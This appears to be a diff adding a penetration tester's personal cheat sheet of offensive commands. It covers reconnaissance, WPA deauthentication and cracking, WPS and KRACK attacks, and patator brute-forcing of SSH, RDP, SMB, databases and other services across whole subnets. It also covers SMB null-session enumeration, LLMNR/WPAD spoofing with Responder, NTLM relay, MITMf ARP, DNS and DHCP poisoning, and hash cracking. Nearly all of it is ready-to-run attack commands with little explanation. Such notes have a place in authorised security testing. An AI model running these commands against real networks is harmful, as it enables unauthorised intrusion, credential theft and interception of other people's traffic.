@@ -1,0 +1,275 @@
+Reconn
+		https://dnsdumpster.com
+		https://pentest-tools.com/home
+		https://searchdns.netcraft.com
+		https://www.pkey.in/tools-i/search-subdomains
+		https://cloudpiercer.org
+		https://censys.io
+		https://shodan.io
+
+		https://github.com/TheRook/subbrute
+		https://github.com/rbsec/dnscan
+		https://github.com/aboul3la/Sublist3r
+		https://github.com/guelfoweb/knock
+		https://bitbucket.org/LaNMaSteR53/recon-ng
+		https://tools.kali.org/information-gathering/dnsrecon
+	
+SQLmap
+	POST request
+		sqlmap -r request.txt -p param
+
+	sqlmap -u url/searhc.php/?id=1 --dbms
+
+Wi-Fi
+	MacBook
+		airport -s
+
+	WPA
+		airmon-ng check kill
+		airmon-ng start wlan0
+		airodump-ng wlan0mon
+		airodump-ng -c [channel] --bssid [bssid] -w "/Users/Jenya/Google Диск/Pentest/ФЦТ/Data/Wi-Fi" wlan0mon
+		aireplay-ng -0 2 -a [router bssid] -c [client bssid] mon0
+			-0 - deauth mode
+			2 - number of packets
+		aircrack-ng -a2 -b [router bssid] -w [path to wordlist] /root/Desktop/*.cap
+
+	WPS
+		wash -i wlan0mon
+		reaver -i wlan0mon -b [bssid] -vv
+		or
+		reaver -i wlan0mon -b {BSSID of router} -c {router channel} -vvv -K 1 -f
+	
+	KRACK
+		https://github.com/vanhoefm/krackattacks-scripts
+		apt-get install libnl-3-dev libnl-genl-3-dev pkg-config libssl-dev net-tools git sysfsutils python-scapy python-pycryptodome
+
+		Disable hardware encryption
+			./krackattack/disable-hwcrypto.sh.
+
+		sudo rfkill unblock wifi
+		./krack-test-client.py
+		./krack-test-client.py --tptk
+		./krack-test-client.py --tptk-rand
+		./krack-test-client.py --group
+
+Bruteforce
+	patator rdp_login host=NET0 0=192.168.1.0/24
+
+	patator mssql_login host=NET0 0=192.168.1.0/24 user=sa password=FILE1 1=passwords.txt -x ignore:fgrep='Login failed for user'
+	patator ssh_login host=NET0 0=192.168.1.0/24 user=FILE1 password=FILE2 1=logins.txt 2=passwords.txt -x ignore:mesg='Authentication failed.'
+	SSH Time-based user enumeration
+		patator ssh_login host=NET0 0=192.168.1.0/24 user=admin password=$(perl -e "print 'A'x50000") --max-retries 0 --timeout 10 -x ignore:time=0-3
+	patator smtp_login host=NET0 0=192.168.1.0/24 user=FILE1 password=FILE2 1=/usr/share/john/password.lst 2=/usr/share/john/usernames.lst  -x ignore:fgrep='incorrect password or account name'
+	patator ftp_login host=NET0 0=192.168.1.0/24 user=FILE1 password=FILE2 1=logins.txt 2=passwords.txt -x ignore:mesg='Login incorrect.'
+	FTP Enumerating users denied login in vsftpd/userlist
+		patator ftp_login host=NET0 0=192.168.1.0/24 user=FILE1 1=logins.txt password=asdf -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
+	patator ldap_login host=NET0 0=192.168.1.0/24 binddn='cn=FILE1,dc=example,dc=com' 1=logins.txt bindpw=FILE2 2=passwords.txt -x ignore:mesg='ldap_bind: Invalid credentials (49)' ssl=1 port=636
+	patator smb_login host=NET0 0=192.168.1.0/24 user=FILE1 password=FILE2 1=logins.txt 2=passwords.txt -x ignore:fgrep=STATUS_LOGON_FAILURE
+	patator mysql_login host=NET0 0=192.168.1.0/24 user=FILE1 password=FILE2 1=logins.txt 2=passwords.txt -x ignore:fgrep='Access denied for user'
+	patator pgsql_login host=NET0 0=192.168.1.0/24 user=postgres password=FILE1 1=passwords.txt -x ignore:fgrep='password authentication failed'
+	patator oracle_login host=NET0 0=192.168.1.0/24 sid=FILE1 1=sids.txt -x ignore:code=ORA-12505
+	patator vnc_login host=NET0 0=192.168.1.0/24 password=FILE1 1=passwords.txt --threads 1 -x retry:fgrep!='Authentication failure' --max-retries -1 -x quit:code=0
+	patator snmp_login host=NET0 0=192.168.1.0/24 community=FILE1 1=names.txt -x ignore:mesg='No SNMP response received before timeout'
+
+	RDP
+		/usr/share/Lazy-RDP
+	Web
+		https://hackware.ru/?p=1453
+	Oracle
+		nmap --script=oracle-sid-brute 
+ 		nmap --script=oracle-brute 
+ 	MS-Sql
+ 		nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156
+ 		use auxiliary/admin/mssql/mssql_enum
+
+Masscan
+	masscan -p22,23,53,445,139,80,443,3389,8080,8443 192.168.1.0/24 --open-only --wait 0 --rate 50000 -oL masscan
+	masscan --port U:161 192.168.1.0/24 --open-only --wait 0 --rate 50000 -oL udp_masscan
+	
+	Output:
+		-oL -oX -oG
+
+	masscan -p22,23,53,445,139,80,443,3389,8080,8443 192.168.1.0/24 --banners --wait 0 --rate 50000 --source-ip 192.168.1.200
+
+	nmap -v -sS -A -T4 192.168.1.0/24
+
+	masscan -p3306,27017,27018,1433,1434,1521,5432,5433 10.0.0.0/24 --open-only --wait -0 -oL masscan_db
+
+IVRE
+    ivre runscans --file/--net --output XMLFork
+    ivre scan2db -r folder
+	
+	Out
+    ivre scancli --openport --port 123 --short
+    ivre scancli --net 10.0.17.0/24 --nmap-xml
+    ivre scancli --net 10.0.19.0/24 --json > 10.0.20.0.json
+		
+Web
+	dirb http://url.com /usr/share/wordlists/dirb/common.txt
+
+SMB enum
+	use auxiliary/scanner/smb/smb_enumshares
+	use auxiliary/scanner/smb/smb_enumusers_domain
+
+	python /usr/share/doc/python-impacket-doc/examples/samrdump.py ip
+	nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24   
+	nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254 
+	nmap -v -p 445 --script=smb-check-vulns  192.168.1.0/24
+
+	nbtscan -v -s : 192.168.1.0/24
+	enum4linux -a target-ip
+
+Null session
+	net use \\TARGET\IPC$ "" /u:""
+	net view \\ip
+	netusers /h \\ip
+	smbclient -L //192.168.99.131
+
+	ridenum 192.168.1.236 500 50000
+
+	./nullinux.py -v --enumshares ip
+	python nullinux.py -users -quick 192.168.1.0/24
+    python nullinux.py -all 192.168.1.0/24
+    python nullinux.py -shares -U 'Domain\User' -P 'Password1' 192.168.1.0
+    python nullinux.py 192.168.1.0/24
+
+SMB
+	use auxiliary/scanner/smb/pipe_auditor 
+	use auxiliary/scanner/smb/pipe_dcerpc_auditor
+	use auxiliary/scanner/smb/smb_enumusers
+	use auxiliary/scanner/smb/smb_enumshares
+
+SNMP enum
+	snmpcheck -t 192.168.1.X -c public
+	snmpwalk -c public -v1 192.168.1.X 1| grep hrSWRunName| cut -d* * -f 
+	snmpenum -t 192.168.1.X
+	onesixtyone -c names -i hosts
+	smbmap.py -u jsmith -p password1 -d workgroup -H 192.168.0.1
+
+Spoofing
+	LLMNR / NBT-NS Spoofing
+		auxiliary/spoof/llmnr/llmnr_response
+		auxiliary/spoof/nbns/nbns_response
+
+		auxiliary/server/capture/smb
+		auxiliary/server/capture/http_ntlm
+		or
+		python Responder.py -i local-ip -I eth0
+
+	WPAD
+		python Responder.py -I eth0 -wFb
+		python Responder.py -I eth0 -r On -w On
+
+		use auxiliary/server/wpad 
+		use auxiliary/spoof/nbns/nbns_response
+
+		NTLM relay
+			apt-get install crackmapexec
+
+			[Responder Core]
+
+			; Servers to start
+			SQL = On
+			SMB = Off     # Turn this off
+			Kerberos = On
+			FTP = On
+			POP = On
+			SMTP = On
+			IMAP = On
+			HTTP = Off    # Turn this off
+			HTTPS = On
+			DNS = On
+			LDAP = On
+
+			cme smb <CIDR> --gen-relay-list targets.txt
+			python Responder.py -I <interface> -r -d -w
+			ntlmrelayx.py -tf targets.txt
+
+			pip install ldap3==1.4.0
+			pip install ldap3
+			pip install impacket
+			pip install tcpshell
+	MiTMf
+		The most basic usage, starts the HTTP proxy SMB,DNS,HTTP servers and Net-Creds on interface eth0:
+			python mitmf.py -i eth0
+		ARP poison the whole subnet with the gateway at 192.168.1.1 using the Spoof plugin:
+			python mitmf.py -i eth0 --spoof --arp --gateway 10.0.17.254
+		Same as above + a WPAD rogue proxy server using the Responder plugin:
+			python mitmf.py -i eth0 --spoof --arp --gateway 10.0.17.254 --responder --wpad
+		ARP poison 192.168.1.16-45 and 192.168.0.1/24 with the gateway at 192.168.1.1:
+			python mitmf.py -i eth0 --spoof --arp --target 192.168.2.16-45,192.168.0.1/24 --gateway 192.168.1.1
+		Enable DNS spoofing while ARP poisoning (Domains to spoof are pulled from the config file):
+			python mitmf.py -i eth0 --spoof --dns --arp --target 192.168.1.0/24 --gateway 192.168.1.1
+		Enable LLMNR/NBTNS/MDNS spoofing:
+			python mitmf.py -i eth0 --responder --wredir --nbtns
+		Enable DHCP spoofing (the ip pool and subnet are pulled from the config file):
+			python mitmf.py -i eth0 --spoof --dhcp
+		
+		load msgrpc Pass=abc123
+		python mitmf.py -i eth0 --spoof --arp --gateway 10.0.17.254 --responder --wpad --forcewpadauth --wredir --nbtns
+		python mitmf.py -i eth0 --spoof --arp --gateway 10.0.17.254 --responder --smbauth --responder --basic --wpad
+		(MITMf) root@kali:/usr/share/MITMf# python mitmf.py -i eth0 --spoof --arp --gateway 10.0.17.254 --filepwn
+		(MITMf) root@kali:/usr/share/MITMf# python mitmf.py -i eth0 --spoof --arp --gateway 10.0.17.254 --dns --hsts --ferretng --screen --responder --wpad --forcewpadauth --basic
+
+		sysctl -w  net.ipv4.ip_forward=1
+		arpspoof
+		dsniff -t 21/tcp=ftp,23/tcp=telnet -n
+
+		sudo apt-get install python3-dev python3-pip libffi-dev libssl-dev
+		apt-get install python-pyasn1 python-flask python-urwid python-dev libxml2-dev libxslt-dev libffi-dev
+		pip install mitmproxy
+		iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
+		iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
+
+		apt-get install bettercap
+
+		git clone https://github.com/singe/dns2proxy.git
+		git clone https://github.com/DanMcInerney/net-creds.git
+
+Databases
+	DB Ports
+		MySql
+			3306
+		Mongo
+			27017,27018
+		MSSql
+			1433,1434
+		Oracle
+			1521
+		Postgres
+			5432,5433
+
+	Oracle
+		oscanner -s 192.168.1.200 -P 1521 
+	Mongo
+		apt-get install mongodb-clients
+		mongo --port <port> -u <username> -p <password> <IP>
+	MySql
+		mysql -h dbipaddress -u user -p
+	SqlLite
+		sqlite3
+	MS-SQL
+		https://www.darkoperator.com/blog/2009/11/27/attacking-mssql-with-metasploit.html
+		use auxiliary/scanner/mssql/mssql_ping
+		use auxiliary/scanner/mssql/mssql_login
+	sqlrecon.exe
+
+VNC
+	sudo apt-get install vncviewer
+
+Crack
+	john --wordlist=/usr/share/wordlists/rockyou.txt hashes
+	hashcat -m 5600 SMB-NTLMv2-Client-10.7.7.30.txt ~/dic.txt 
+
+Some new SSH algorithms
+    ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 user@ip
+    ssh-dss user@ip
+
+https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation
+
+https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
+https://github.com/lgandx/Responder
+https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
+https://github.com/byt3bl33d3r/MITMf
+https://hackware.ru/?p=917
